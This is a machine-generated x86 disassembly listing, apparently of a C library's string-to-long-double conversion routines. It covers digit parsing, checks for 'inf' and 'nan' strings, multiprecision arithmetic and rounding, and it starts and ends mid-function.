mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08088130
leave
ret
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x20
mov esi, dword [arg_1ch]
mov ecx, dword [arg_14h]
mov eax, dword [arg_ch]
mov edx, dword [arg_10h]
mov edi, dword [arg_8h]
mov dword [var_18h], ecx
mov dword [var_10h], eax
mov dword [var_14h], edx
cmp dword [var_10h], 0xffffc002
mov eax, dword [arg_18h]
mov dword [var_1ch], eax
jge 0x808a0a6
mov ebx, 0xffffc002
sub ebx, dword [var_10h]
cmp ebx, 0x40
jg 0x808a202
movzx ecx, byte [var_1ch]
mov eax, 1
mov edx, esi
or edx, 1
shl eax, cl
dec eax
test dword [var_18h], eax
cmovne esi, edx
cmp ebx, 0x40
je 0x808a1ce
cmp ebx, 0x1f
jle 0x808a19e
mov ecx, ebx
lea eax, [ebx + 0x1e]
dec ecx
cmovns eax, ecx
sar eax, 5
mov edx, dword [edi + eax*4]
shl eax, 5
mov dword [var_18h], edx
mov edx, ecx
sub edx, eax
mov dword [var_1ch], edx
xor edx, edx
lea esi, [esi]
cmp ecx, 0xffffffff
lea eax, [ebx + 0x1e]
cmovg eax, ecx
sar eax, 5
cmp edx, eax
jge 0x808a02f
mov eax, esi
or eax, 1
cmp dword [edi + edx*4], 0
cmovne esi, eax
inc edx
jmp 0x808a010
movzx ecx, byte [var_1ch]
mov eax, 1
mov edx, esi
or edx, 1
shl eax, cl
mov ecx, ebx
dec eax
test dword [var_18h], eax
mov dword [esp], edi
cmovne esi, edx
cmp ebx, 0xffffffff
lea edx, [ebx + 0x1f]
cmovg edx, ebx
sar edx, 5
mov eax, edx
shl eax, 5
sub ecx, eax
mov eax, 2
sub eax, edx
mov dword [var_sp_ch], ecx
lea edx, [edi + edx*4]
mov dword [var_4h], edx
mov dword [var_sp_8h], eax
call fcn.0808c750
xor edx, edx
nop
lea esi, [esi]
cmp ebx, 0xffffffff
lea eax, [ebx + 0x1f]
cmovg eax, ebx
sar eax, 5
cmp edx, eax
jge 0x808a09f
mov ecx, edx
inc edx
sub ecx, eax
mov dword [edi + ecx*4 + 8], 0
jmp 0x808a080
mov dword [var_10h], 0xffffc001
movzx ecx, byte [var_1ch]
mov eax, dword [var_18h]
shr eax, cl
test al, 1
je 0x808a122
test esi, esi
jne 0x808a197
mov edx, dword [edi]
test dl, 1
jne 0x808a0d0
mov eax, 1
shl eax, cl
dec eax
test dword [var_18h], eax
je 0x808a122
nop
lea eax, [edx + 1]
lea ebx, [edi + 4]
mov esi, 2
cmp eax, edx
mov dword [edi], eax
mov ecx, ebx
jae 0x808a163
mov eax, dword [edi + 4]
lea ebx, [edi + 8]
mov esi, 1
mov ecx, ebx
inc eax
test eax, eax
mov dword [edi + 4], eax
jne 0x808a163
inc dword [var_10h]
mov dword [esp], edi
mov dword [var_4h], edi
mov dword [var_sp_ch], 1
mov dword [var_sp_8h], 2
call fcn.0808c750
or dword [edi + 4], 0x80000000
cmp dword [var_10h], 0x4000
jle 0x808a148
mov eax, dword [var_14h]
test eax, eax
je 0x808a140
fld dword [0x80a6100]
add esp, 0x20
pop ebx
pop esi
pop edi
leave
ret
fld dword [0x80a61a0]
jmp 0x808a138
mov eax, dword [var_14h]
mov edx, dword [var_10h]
mov dword [arg_8h], edi
mov dword [arg_10h], eax
mov dword [arg_ch], edx
add esp, 0x20
pop ebx
pop esi
pop edi
leave
jmp 0x808d8e0
cmp ecx, ebx
je 0x808a17b
xor edx, edx
dec esi
cmp edx, esi
jge 0x808a17b
mov esi, esi
mov eax, dword [ebx + edx*4]
mov dword [ecx + edx*4], eax
inc edx
cmp edx, esi
jl 0x808a170
cmp dword [var_10h], 0xffffc001
jne 0x808a122
mov edx, dword [edi + 4]
mov eax, 0xffffc002
test edx, edx
cmovns eax, dword [var_10h]
mov dword [var_10h], eax
jmp 0x808a122
mov edx, dword [edi]
jmp 0x808a0d0
test ebx, ebx
jle 0x808a09f
mov eax, dword [edi]
lea edx, [ebx - 1]
mov dword [var_1ch], edx
mov dword [var_18h], eax
mov dword [esp], edi
mov dword [var_4h], edi
mov dword [var_sp_ch], ebx
mov dword [var_sp_8h], 2
call fcn.0808c750
jmp 0x808a09f
mov eax, dword [edi + 4]
mov dword [var_1ch], 0x1f
xor edx, edx
mov dword [var_18h], eax
mov ecx, dword [edi + edx*4]
mov eax, esi
or eax, 1
test ecx, ecx
cmovne esi, eax
inc edx
cmp edx, 1
jle 0x808a1dd
mov dword [edi], 0
mov dword [edi + 4], 0
jmp 0x808a09f
call fcn.08048b20
fldz
mov dword [eax], 0x21
jmp 0x808a138
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push edi
xor edi, edi
push esi
xor esi, esi
push ebx
sub esp, 0x18
mov eax, dword [arg_14h]
mov ebx, dword [arg_8h]
mov dword [eax], 0
lea esi, [esi]
cmp edi, 9
je 0x808a399
movzx ecx, byte [ebx]
lea eax, [ecx - 0x30]
cmp al, 9
jbe 0x808a26b
mov eax, dword [arg_24h]
test eax, eax
je 0x808a265
mov eax, dword [arg_24h]
cmp cl, byte [eax]
je 0x808a35f
add ebx, dword [arg_20h]
movzx ecx, byte [ebx]
movsx eax, cl
dec dword [arg_ch]
lea edx, [esi + esi*4]
lea esi, [eax + edx*2 - 0x30]
inc ebx
inc edi
mov eax, dword [arg_ch]
test eax, eax
jg 0x808a240
mov edx, dword [arg_18h]
mov eax, dword [edx]
test eax, eax
jle 0x808a353
lea edx, [eax + edi]
cmp edx, 9
jg 0x808a353
imul esi, dword [eax*4 + 0x80a61c0]
mov ecx, dword [arg_18h]
mov edx, dword [edx*4 + 0x80a61c0]
mov dword [ecx], 0
mov ecx, dword [arg_14h]
mov eax, dword [ecx]
test eax, eax
jne 0x808a2d0
mov eax, dword [arg_10h]
mov dword [eax], esi
mov dword [ecx], 1
add esp, 0x18
mov eax, ebx
pop ebx
pop esi
pop edi
leave
ret
mov dword [var_ch], edx
mov dword [var_8h], eax
mov edx, dword [arg_10h]
mov dword [var_4h], edx
mov dword [esp], edx
call fcn.0808cae0
mov dword [var_14h], eax
mov edi, dword [arg_10h]
mov eax, dword [arg_14h]
mov ecx, dword [eax]
add edi, 4
mov eax, dword [arg_10h]
mov edx, dword [eax]
lea eax, [edx + esi]
mov esi, dword [arg_10h]
cmp eax, edx
mov dword [esi], eax
mov esi, edi
jae 0x808a339
dec ecx
je 0x808a31d
mov edx, dword [edi]
add edi, 4
inc edx
mov dword [esi], edx
add esi, 4
test edx, edx
jne 0x808a339
dec ecx
jne 0x808a30b
mov eax, 1
add dword [var_14h], eax
je 0x808a2c6
mov edx, dword [arg_14h]
mov esi, dword [var_14h]
mov ecx, dword [arg_10h]
mov eax, dword [edx]
mov dword [ecx + eax*4], esi
inc dword [edx]
jmp 0x808a2c6
cmp esi, edi
je 0x808a34f
xor edx, edx
dec ecx
cmp edx, ecx
jge 0x808a34f
mov eax, dword [edi + edx*4]
mov dword [esi + edx*4], eax
inc edx
cmp edx, ecx
jl 0x808a344
xor eax, eax
jmp 0x808a322
mov edx, dword [edi*4 + 0x80a61c0]
jmp 0x808a2b2
movzx eax, byte [eax + 1]
mov edx, 1
test al, al
je 0x808a390
lea esi, [esi]
cmp al, byte [edx + ebx]
jne 0x808a381
mov ecx, dword [arg_24h]
inc edx
movzx eax, byte [edx + ecx]
test al, al
jne 0x808a370
test al, al
jne 0x808a265
add ebx, edx
jmp 0x808a268
mov ecx, dword [arg_24h]
movzx eax, byte [ecx + 1]
jmp 0x808a381
mov edx, dword [arg_14h]
mov eax, dword [edx]
test eax, eax
jne 0x808a3b6
mov ecx, dword [arg_10h]
mov dword [ecx], esi
mov dword [edx], 1
xor edi, edi
xor esi, esi
jmp 0x808a249
mov dword [var_8h], eax
mov dword [var_ch], 0x3b9aca00
mov eax, dword [arg_10h]
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808cae0
mov dword [var_10h], eax
mov edx, dword [arg_14h]
mov edi, dword [arg_10h]
mov eax, dword [arg_10h]
mov ecx, dword [edx]
add edi, 4
mov edx, dword [eax]
lea eax, [edx + esi]
mov esi, dword [arg_10h]
cmp eax, edx
mov dword [esi], eax
mov esi, edi
jae 0x808a423
dec ecx
je 0x808a407
mov edx, dword [edi]
add edi, 4
inc edx
mov dword [esi], edx
add esi, 4
test edx, edx
jne 0x808a423
dec ecx
jne 0x808a3f5
mov eax, 1
add dword [var_10h], eax
je 0x808a3ad
mov edx, dword [arg_14h]
mov esi, dword [var_10h]
mov ecx, dword [arg_10h]
mov eax, dword [edx]
mov dword [ecx + eax*4], esi
inc dword [edx]
jmp 0x808a3ad
cmp esi, edi
je 0x808a43b
xor edx, edx
dec ecx
cmp edx, ecx
jge 0x808a43b
mov esi, esi
mov eax, dword [edi + edx*4]
mov dword [esi + edx*4], eax
inc edx
cmp edx, ecx
jl 0x808a430
xor eax, eax
jmp 0x808a40c
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x1138
mov ecx, dword [arg_10h]
mov eax, dword [arg_14h]
mov dword [var_1078h], 0xa
mov dword [var_10a0h], 0
test ecx, ecx
mov edx, dword [eax + 4]
je 0x808a499
mov ecx, dword [edx + 0x2c]
mov dword [var_10a4h], ecx
movzx eax, byte [ecx]
test al, al
jle 0x808a499
cmp al, 0x7f
je 0x808a499
mov esi, dword [edx + 0x28]
mov dword [var_10a0h], esi
cmp byte [esi], 0
jne 0x808a4a3
mov dword [var_10a0h], 0
mov dword [var_10a4h], 0
mov edx, dword [edx + 0x24]
mov dword [var_109ch], edx
mov dword [esp], edx
call fcn.08053400
mov edi, dword [arg_8h]
mov dword [var_1080h], 0
mov dword [var_10a8h], eax
mov dword [var_106ch], 0
mov dword [var_1074h], 0
mov eax, dword [arg_14h]
dec edi
mov edx, dword [eax + 0x34]
inc edi
movzx esi, byte [edi]
mov ecx, esi
movsx eax, cl
test byte [edx + eax*2 + 1], 0x20
jne 0x808a4e2
cmp cl, 0x2d
je 0x808c261
cmp cl, 0x2b
je 0x808c258
mov edx, dword [var_109ch]
xor ebx, ebx
movzx edx, byte [edx]
test dl, dl
mov byte [var_1112h], dl
mov byte [var_1111h], dl
je 0x808c24d
mov eax, edx
cmp byte [ebx + edi], al
jne 0x808c240
mov ecx, dword [var_109ch]
inc ebx
movzx eax, byte [ebx + ecx]
test al, al
jne 0x808a525
movzx eax, byte [ebx + edi]
cmp al, 0x2f
jle 0x808a54d
cmp al, 0x39
jle 0x808a727
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x808a727
mov ecx, esi
mov esi, dword [arg_14h]
movsx eax, cl
mov ebx, eax
mov ecx, dword [esi + 0x38]
cmp dword [ecx + eax*4], 0x69
je 0x808a6a9
cmp dword [ecx + ebx*4], 0x6e
jne 0x808a693
mov ecx, dword [arg_14h]
mov dword [var_8h], 3
mov dword [var_4h], 0x80a0fb8
mov dword [esp], edi
mov dword [var_ch], ecx
call fcn.0808dd40
test eax, eax
jne 0x808a693
fld dword [0x80a61a4]
add edi, 3
fstp xword [ebp - 0x10b4]
cmp byte [edi], 0x28
je 0x808a5d1
mov eax, dword [arg_ch]
test eax, eax
je 0x808a5c0
mov eax, dword [arg_ch]
mov dword [eax], edi
fld xword [ebp - 0x10b4]
add esp, 0x1138
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [arg_14h]
mov ebx, edi
mov ecx, dword [eax + 0x38]
inc edi
movzx edx, byte [edi]
lea eax, [edx - 0x30]
cmp al, 9
jbe 0x808a5d9
movsx eax, dl
mov eax, dword [ecx + eax*4]
cmp eax, 0x60
jle 0x808a5f4
cmp eax, 0x7a
jle 0x808a5d9
cmp dl, 0x5f
je 0x808a5d9
cmp dl, 0x29
je 0x808a602
mov edi, ebx
jmp 0x808a5b4
mov edx, dword [arg_14h]
lea eax, [var_1060h]
mov dword [var_ch], 0
mov dword [var_4h], eax
mov dword [var_8h], 0
lea eax, [ebx + 1]
mov dword [esp], eax
mov dword [var_10h], edx
call fcn.080856c0
cmp dword [var_1060h], edi
mov ecx, eax
mov ebx, edx
jne 0x808a5b4
and edx, 0x7fffffff
mov dword [var_105ch], 0
mov dword [var_1058h], 0xc0000000
mov esi, edx
mov dword [var_1054h], 0x7fff
or esi, eax
jne 0x808a66f
xor ecx, ecx
mov ebx, 0x40000000
mov eax, ebx
mov dword [var_105ch], ecx
or eax, 0x80000000
mov dword [var_1058h], eax
fld xword [ebp - 0x105c]
fstp xword [ebp - 0x10b4]
jmp 0x808a5b4
mov eax, dword [arg_ch]
test eax, eax
je 0x808a6a2
mov ecx, dword [arg_8h]
mov edx, dword [arg_ch]
mov dword [edx], ecx
fldz
jmp 0x808a5c6
mov dword [var_ch], esi
mov dword [var_8h], 3
mov dword [var_4h], 0x80a0fc0
mov dword [esp], edi
call fcn.0808dd40
test eax, eax
jne 0x808a71c
mov eax, dword [arg_ch]
test eax, eax
je 0x808a6fc
lea ebx, [edi + 3]
mov dword [var_ch], esi
mov dword [var_8h], 5
mov dword [esp], ebx
mov dword [var_4h], str.inity
call fcn.0808dd40
test eax, eax
lea edx, [edi + 8]
mov eax, dword [arg_ch]
cmove ebx, edx
mov dword [eax], ebx
mov edx, dword [var_1074h]
test edx, edx
je 0x808a711
fld dword [0x80a6100]
jmp 0x808a5c6
fld dword [0x80a61a0]
jmp 0x808a5c6
mov edx, dword [arg_14h]
mov ecx, dword [edx + 0x38]
jmp 0x808a56f
mov eax, esi
cmp al, 0x30
je 0x808c207
mov eax, dword [var_10a0h]
mov dword [var_1088h], edi
test eax, eax
je 0x808c1ed
mov ecx, dword [var_10a0h]
movzx edx, byte [ecx]
mov esi, esi
mov eax, esi
cmp al, 0x30
je 0x808a785
xor ebx, ebx
test dl, dl
je 0x808c1df
mov ecx, dword [var_10a0h]
movzx eax, byte [ecx]
lea esi, [esi]
mov ecx, esi
cmp cl, al
jne 0x808a78b
mov ecx, dword [var_10a0h]
inc ebx
movzx eax, byte [ebx + ecx]
test al, al
jne 0x808a770
inc edi
movzx esi, byte [edi]
jmp 0x808a750
test al, al
je 0x808a785
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x808a7a3
cmp dword [var_1078h], 0x10
je 0x808c18e
mov dword [var_1084h], edi
mov dword [var_1090h], 0
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x808c183
cmp dword [var_1078h], 0x10
je 0x808c163
mov eax, dword [var_10a0h]
test eax, eax
je 0x808a80a
mov ecx, dword [var_10a0h]
xor ebx, ebx
movzx eax, byte [ecx]
test al, al
je 0x808c155
cmp al, byte [ebx + edi]
jne 0x808a806
mov edx, dword [var_10a0h]
inc ebx
movzx eax, byte [ebx + edx]
test al, al
jne 0x808a7e8
lea esi, [esi]
inc edi
movzx esi, byte [edi]
jmp 0x808a7b3
test al, al
je 0x808a800
mov eax, dword [var_10a4h]
test eax, eax
je 0x808bdc3
mov ebx, dword [var_1090h]
test ebx, ebx
jle 0x808bdc3
mov ecx, dword [var_1088h]
mov eax, dword [var_10a4h]
mov dword [var_4h], edi
mov edx, dword [var_10a0h]
mov dword [esp], ecx
mov dword [var_ch], eax
mov dword [var_8h], edx
call fcn.08049980
cmp edi, eax
mov ecx, eax
je 0x808bdb4
cmp eax, dword [var_1088h]
je 0x808bd9c
cmp eax, dword [var_1084h]
jb 0x808bd8c
mov ecx, dword [var_1084h]
mov edi, eax
mov dword [var_1090h], 0
cmp ecx, eax
jae 0x808a8a5
movzx eax, byte [ecx]
mov edx, dword [var_1090h]
inc edx
sub eax, 0x30
cmp al, 9
cmova edx, dword [var_1090h]
inc ecx
cmp ecx, edi
mov dword [var_1090h], edx
jb 0x808a884
mov ecx, dword [var_1090h]
mov dword [var_1098h], 0
mov dword [var_1094h], ecx
mov edx, dword [arg_ch]
test edx, edx
je 0x808a8c7
mov edx, dword [arg_ch]
mov dword [edx], edi
mov eax, dword [var_1090h]
test eax, eax
jne 0x808a8ea
mov eax, dword [var_1074h]
test eax, eax
je 0x808a6a2
fld dword [0x80a6104]
jmp 0x808a5c6
mov eax, dword [var_1098h]
test eax, eax
je 0x808a99c
mov ecx, dword [var_109ch]
mov esi, dword [var_109ch]
movzx ecx, byte [ecx]
mov byte [var_1112h], cl
movzx edx, byte [esi + 1]
mov ecx, dword [var_1084h]
movzx eax, byte [var_1112h]
cmp byte [ecx], al
je 0x808a92a
inc dword [var_1084h]
jmp 0x808a911
test dl, dl
mov ebx, 1
je 0x808bd80
mov esi, dword [var_109ch]
movzx eax, byte [esi + 1]
mov ecx, dword [var_1084h]
cmp al, byte [ebx + ecx]
jne 0x808bd70
mov esi, dword [var_109ch]
inc ebx
movzx eax, byte [ebx + esi]
test al, al
jne 0x808a941
mov eax, dword [var_1098h]
add eax, dword [var_10a8h]
add dword [var_1084h], eax
cmp dword [var_1078h], 0x10
je 0x808bd5a
mov edx, dword [var_106ch]
sub edx, dword [var_1098h]
mov esi, dword [var_1098h]
mov dword [var_106ch], edx
sub dword [var_1090h], esi
cmp dword [var_1078h], 0x10
je 0x808bb42
mov ebx, dword [var_106ch]
test ebx, ebx
mov edx, ebx
js 0x808bb29
mov eax, dword [var_1090h]
sub eax, dword [var_1094h]
cmp ebx, eax
cmovle eax, ebx
add dword [var_1094h], eax
mov ebx, edx
sub ebx, eax
mov eax, dword [var_1094h]
mov dword [var_106ch], ebx
add eax, ebx
cmp eax, 0x1345
jg 0x808ab74
cmp ebx, 0xffffecaa
jl 0x808bb19
mov ecx, dword [var_1094h]
test ecx, ecx
jle 0x808ad3c
mov esi, dword [var_109ch]
mov edx, dword [var_10a0h]
lea eax, [var_106ch]
mov ecx, dword [var_10a8h]
mov dword [var_10h], eax
mov eax, dword [var_1084h]
mov dword [var_14h], esi
mov dword [var_1ch], edx
mov esi, dword [var_1094h]
mov dword [var_18h], ecx
lea edx, [var_1070h]
mov dword [esp], eax
lea ecx, [var_82ch]
mov dword [var_ch], edx
mov dword [var_8h], ecx
mov dword [var_4h], esi
call fcn.0808a220
mov ebx, dword [var_106ch]
mov dword [var_1084h], eax
test ebx, ebx
jle 0x808ab49
lea edx, [var_82ch]
lea ecx, [var_104ch]
mov edi, 1
mov dword [var_10c0h], edx
mov dword [var_10c4h], ecx
mov dword [var_10c8h], 0x80a7020
test edi, ebx
je 0x808ab26
mov eax, dword [var_10c8h]
mov edx, dword [var_1070h]
xor ebx, edi
mov dword [var_106ch], ebx
mov esi, dword [eax + 4]
sub esi, 2
cmp edx, esi
jl 0x808baea
mov dword [var_10h], esi
mov eax, dword [eax]
mov dword [var_8h], edx
mov edx, dword [var_10c4h]
lea eax, [eax*4 + 0x80a6248]
mov dword [var_ch], eax
mov dword [esp], edx
mov eax, dword [var_10c0h]
mov dword [var_4h], eax
call fcn.0808c7c0
mov edx, eax
mov eax, dword [var_1070h]
add eax, esi
test edx, edx
mov dword [var_1070h], eax
jne 0x808ab08
dec eax
mov dword [var_1070h], eax
mov eax, dword [var_10c0h]
mov esi, dword [var_10c4h]
mov ebx, dword [var_106ch]
mov dword [var_10c0h], esi
mov dword [var_10c4h], eax
add edi, edi
add dword [var_10c8h], 0x10
test ebx, ebx
jne 0x808aa96
lea eax, [var_104ch]
cmp dword [var_10c0h], eax
je 0x808bace
mov edx, dword [var_1070h]
bsr ecx, dword [ebp + edx*4 - 0x830]
xor ecx, 0x1f
mov eax, edx
mov dword [var_10cch], edx
shl eax, 5
sub eax, ecx
cmp eax, 0x4000
mov dword [var_1080h], eax
jle 0x808ab84
call fcn.08048b20
mov dword [eax], 0x22
jmp 0x808a6fc
cmp dword [var_1080h], 0x40
jle 0x808ad00
mov edx, dword [var_1080h]
mov eax, dword [var_1080h]
mov dword [var_10d4h], 0x1f
sub edx, 0x21
sub eax, 0x40
mov esi, eax
mov edi, eax
cmovs esi, edx
sar esi, 5
mov edx, esi
lea ecx, [esi - 1]
shl edx, 5
sub edi, edx
cmovne ecx, esi
lea eax, [edi - 1]
test edi, edi
cmove eax, dword [var_10d4h]
mov dword [var_10d0h], ecx
mov dword [var_10d4h], eax
jne 0x808ac78
mov eax, dword [ebp + esi*4 - 0x82c]
mov dword [var_1068h], eax
mov eax, dword [ebp + esi*4 - 0x828]
mov dword [var_1064h], eax
mov eax, dword [var_82ch]
xor ebx, ebx
test eax, eax
jne 0x808ac14
inc ebx
mov eax, dword [ebp + ebx*4 - 0x82c]
test eax, eax
je 0x808ac08
xor eax, eax
mov esi, dword [var_1090h]
cmp dword [var_1094h], esi
jl 0x808ac2c
cmp ebx, dword [var_10d0h]
jge 0x808ac31
mov eax, 1
mov dword [var_14h], eax
mov edx, dword [var_10d0h]
mov ecx, dword [var_1074h]
mov eax, dword [var_10d4h]
mov dword [var_8h], ecx
mov dword [var_10h], eax
mov eax, dword [ebp + edx*4 - 0x82c]
mov dword [var_ch], eax
mov eax, dword [var_1080h]
dec eax
lea esi, [var_1068h]
mov dword [var_4h], eax
mov dword [esp], esi
call fcn.08089f80
jmp 0x808a5c6
mov eax, dword [var_10cch]
mov ebx, esi
dec eax
cmp esi, eax
jge 0x808acde
mov dword [var_10d8h], eax
mov dword [var_10dch], 0x20
lea eax, [var_1068h]
sub dword [var_10dch], edi
mov dword [var_1124h], eax
mov edx, dword [ebp + ebx*4 - 0x82c]
mov ecx, edi
mov eax, dword [ebp + ebx*4 - 0x828]
inc ebx
shr edx, cl
movzx ecx, byte [var_10dch]
shl eax, cl
or edx, eax
mov eax, dword [var_1124h]
mov dword [eax], edx
add eax, 4
cmp ebx, dword [var_10d8h]
mov dword [var_1124h], eax
jl 0x808aca7
mov eax, ebx
sub eax, esi
dec eax
jg 0x808abfc
mov eax, dword [ebp + ebx*4 - 0x82c]
mov ecx, edi
shr eax, cl
jmp 0x808abf6
lea esi, [esi]
mov eax, dword [var_1094h]
cmp dword [var_1090h], eax
je 0x808b95b
mov ecx, dword [var_10cch]
lea esi, [var_82ch]
lea edi, [var_1068h]
cld
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
mov eax, dword [var_1070h]
cmp eax, 1
jle 0x808b94b
mov esi, 0x42
lea edx, [var_104ch]
lea ecx, [var_82ch]
sub esi, dword [var_1080h]
mov dword [var_10ech], edx
mov dword [var_10f0h], ecx
mov edx, 0x55555556
mov ecx, dword [var_1090h]
mov dword [var_10f4h], 0x80a7020
sub ecx, dword [var_1094h]
mov dword [var_10e8h], 0
mov eax, esi
imul edx
mov eax, esi
sar eax, 0x1f
sub edx, eax
lea eax, [edx + 2]
cmp ecx, eax
jle 0x808adb0
mov ecx, dword [var_1094h]
mov dword [var_10e8h], 1
lea edx, [edx + ecx + 2]
mov dword [var_1090h], edx
mov esi, dword [var_1090h]
mov dword [var_107ch], 0
sub esi, dword [var_1094h]
sub esi, ebx
mov ebx, 1
mov dword [var_10e4h], esi
test dword [var_10e4h], ebx
je 0x808ae1b
mov eax, dword [var_107ch]
xor dword [var_10e4h], ebx
test eax, eax
jne 0x808b8cf
mov eax, dword [var_10f4h]
mov edi, dword [var_10ech]
cld
mov edx, dword [eax + 4]
mov esi, dword [eax]
sub edx, 2
lea esi, [esi*4 + 0x80a6248]
mov ecx, edx
mov dword [var_107ch], edx
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
mov eax, dword [var_10e4h]
add ebx, ebx
add dword [var_10f4h], 0x10
test eax, eax
jne 0x808add3
lea eax, [var_82ch]
cmp dword [var_10ech], eax
je 0x808b8b3
mov edx, dword [var_10a0h]
mov esi, dword [var_109ch]
lea eax, [var_106ch]
mov ecx, dword [var_10a8h]
mov dword [var_10h], eax
mov dword [var_1ch], edx
mov dword [var_14h], esi
lea edx, [var_1070h]
mov esi, dword [var_1094h]
mov dword [var_ch], edx
mov dword [var_18h], ecx
sub dword [var_1090h], esi
mov edx, dword [var_1084h]
lea ecx, [var_82ch]
mov eax, dword [var_1090h]
mov dword [var_8h], ecx
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.0808a220
mov ecx, dword [var_107ch]
bsr eax, dword [ebp + ecx*4 - 0x1050]
mov ebx, eax
xor ebx, 0x1f
jle 0x808af09
lea esi, [var_104ch]
mov dword [var_8h], ecx
mov dword [var_ch], ebx
mov dword [var_4h], esi
mov dword [esp], esi
call fcn.0808c6f0
mov eax, dword [var_1070h]
lea edx, [var_82ch]
mov dword [var_ch], ebx
mov dword [var_4h], edx
mov dword [esp], edx
mov dword [var_8h], eax
call fcn.0808c6f0
test eax, eax
mov edx, eax
je 0x808af09
mov eax, dword [var_1070h]
mov dword [ebp + eax*4 - 0x82c], edx
inc eax
mov dword [var_1070h], eax
cmp dword [var_107ch], 1
mov esi, dword [var_1080h]
mov dword [var_106ch], esi
je 0x808b75b
cmp dword [var_107ch], 2
je 0x808b45a
mov eax, dword [var_107ch]
mov ecx, dword [var_107ch]
mov dword [var_110ch], 0
xor edi, edi
mov edx, dword [ebp + eax*4 - 0x1054]
mov esi, dword [ebp + eax*4 - 0x1050]
mov eax, dword [var_1070h]
mov dword [var_1108h], edx
sub ecx, eax
mov dword [var_8h], eax
lea eax, [ebp + ecx*4 - 0x104c]
mov dword [var_4h], eax
lea eax, [var_82ch]
mov dword [esp], eax
call fcn.0808c330
test eax, eax
jle 0x808af9c
mov eax, dword [var_1070h]
mov dword [ebp + eax*4 - 0x82c], 0
inc eax
mov dword [var_1070h], eax
mov eax, dword [var_1070h]
cmp eax, dword [var_107ch]
jge 0x808b438
mov edx, dword [var_107ch]
sub edx, eax
mov dword [var_1110h], edx
mov edx, dword [var_1080h]
test edx, edx
jle 0x808b3e1
mov eax, dword [var_1110h]
shl eax, 5
add eax, dword [var_1080h]
cmp eax, 0x40
jg 0x808b31e
mov ecx, dword [var_1070h]
mov eax, dword [var_1068h]
mov dword [var_1068h], 0
test ecx, ecx
mov dword [var_1064h], eax
jle 0x808b01e
mov eax, dword [var_1110h]
lea edx, [eax + ecx]
mov eax, dword [ebp + ecx*4 - 0x830]
dec ecx
test ecx, ecx
mov dword [ebp + edx*4 - 0x82c], eax
jg 0x808b002
mov edx, dword [var_1110h]
xor eax, eax
inc edx
cmp eax, edx
jge 0x808b03b
mov dword [ebp + eax*4 - 0x82c], 0
inc eax
cmp eax, edx
jl 0x808b02b
shl dword [var_1110h], 5
mov edx, dword [var_1110h]
add dword [var_1080h], edx
mov eax, dword [var_107ch]
cmp dword [var_1080h], 0x40
mov dword [ebp + eax*4 - 0x104c], 0
mov edx, eax
mov eax, dword [ebp + eax*4 - 0x82c]
mov ebx, eax
jg 0x808b1e6
lea ecx, [edx + 1]
lea eax, [edx - 1]
mov dword [var_111ch], ecx
mov dword [var_1118h], eax
cmp ebx, esi
mov edi, 0xffffffff
je 0x808b0e7
mov edx, dword [var_107ch]
mov eax, dword [ebp + edx*4 - 0x830]
mov edx, ebx
div esi
mov ecx, edx
mov edi, eax
mov eax, dword [var_1108h]
mul edi
cmp edx, ecx
mov ebx, eax
jbe 0x808b300
add ecx, esi
dec edi
cmp ecx, esi
jb 0x808b0e7
cmp ebx, dword [var_1108h]
lea eax, [edx - 1]
cmovb edx, eax
sub ebx, dword [var_1108h]
cmp edx, ecx
ja 0x808b0b9
jne 0x808b0e7
mov eax, dword [var_107ch]
cmp ebx, dword [ebp + eax*4 - 0x834]
ja 0x808b0b9
mov edx, dword [var_111ch]
lea ecx, [var_104ch]
lea eax, [var_82ch]
mov dword [var_ch], edi
mov dword [var_4h], ecx
mov dword [esp], eax
mov dword [var_8h], edx
call fcn.0808d600
mov edx, dword [var_107ch]
cmp dword [ebp + edx*4 - 0x82c], eax
je 0x808b13d
lea eax, [var_82ch]
lea ecx, [var_104ch]
mov dword [var_ch], edx
mov dword [var_8h], ecx
mov dword [var_4h], eax
mov dword [esp], eax
dec edi
call fcn.0808c2a0
mov ecx, dword [var_107ch]
mov edx, dword [var_1118h]
mov eax, dword [ebp + ecx*4 - 0x830]
test edx, edx
mov dword [ebp + ecx*4 - 0x82c], eax
mov ebx, eax
jle 0x808b170
mov eax, dword [ebp + edx*4 - 0x830]
mov dword [ebp + edx*4 - 0x82c], eax
dec edx
test edx, edx
jg 0x808b15d
mov eax, dword [var_1080h]
test eax, eax
jne 0x808b273
test edi, edi
mov edx, 0x20
je 0x808b18d
bsr edx, edi
xor edx, 0x1f
mov ecx, 0x20
sub dword [var_106ch], edx
mov eax, ecx
sub eax, edx
cmp eax, 0x40
jle 0x808b253
add edx, 0x40
mov eax, edi
mov dword [var_1120h], 0x61
sub ecx, edx
mov dword [var_110ch], edx
shr eax, cl
mov dword [var_1068h], eax
mov ecx, dword [var_1120h]
cmp ecx, 0x40
mov dword [var_1080h], ecx
jle 0x808b089
mov esi, dword [var_107ch]
mov eax, dword [ebp + esi*4 - 0x82c]
test eax, eax
mov edx, dword [var_107ch]
jne 0x808b204
test edx, edx
js 0x808b204
dec edx
mov ebx, dword [ebp + edx*4 - 0x82c]
test ebx, ebx
jne 0x808b204
test edx, edx
jns 0x808b1f4
mov ecx, dword [var_10e8h]
xor eax, eax
test ecx, ecx
jne 0x808b214
test edx, edx
js 0x808b219
mov eax, 1
mov dword [var_14h], eax
lea edx, [var_1068h]
mov dword [var_ch], edi
mov eax, 0x1f
mov dword [esp], edx
sub eax, dword [var_110ch]
mov dword [var_10h], eax
mov eax, dword [var_1074h]
mov dword [var_8h], eax
mov eax, dword [var_106ch]
dec eax
mov dword [var_4h], eax
jmp 0x808ac6e
neg edx
mov dword [var_1064h], 0
mov dword [var_1068h], edi
add edx, 0x20
mov dword [var_1120h], edx
jmp 0x808b1c4
mov eax, dword [var_1080h]
add eax, 0x20
cmp eax, 0x40
mov dword [var_1120h], eax
jg 0x808b29e
